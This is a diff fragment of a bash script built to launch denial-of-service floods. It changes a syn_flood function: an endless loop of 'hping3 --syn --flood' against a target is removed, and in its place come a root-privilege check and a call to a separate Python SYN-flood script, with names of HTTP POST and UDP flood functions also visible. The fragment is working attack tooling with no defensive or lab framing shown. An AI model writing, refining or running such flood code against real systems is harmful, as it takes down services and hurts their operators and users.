@@ -143,10 +143,16 @@ http_post_flood() {
 syn_flood() {
     target=$1
     port=$2
-    echo -e "${CYAN}[*] Starting TCP SYN flood on $target:$port (requires root)${RESET}"
-    while true; do
-        sudo hping3 --syn -p $port --flood $target &>/dev/null &
-    done
+    packets=${3:-10000}
+
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] SYN flood requires root privileges.${RESET}"
+        exit 1
+    fi
+
+    echo -e "${CYAN}[*] Starting custom TCP SYN flood on $target:$port (requires root)${RESET}"
+    
+    python3 syn_flood.py "$target" "$port" "$packets" &
 }
 
 udp_flood() {
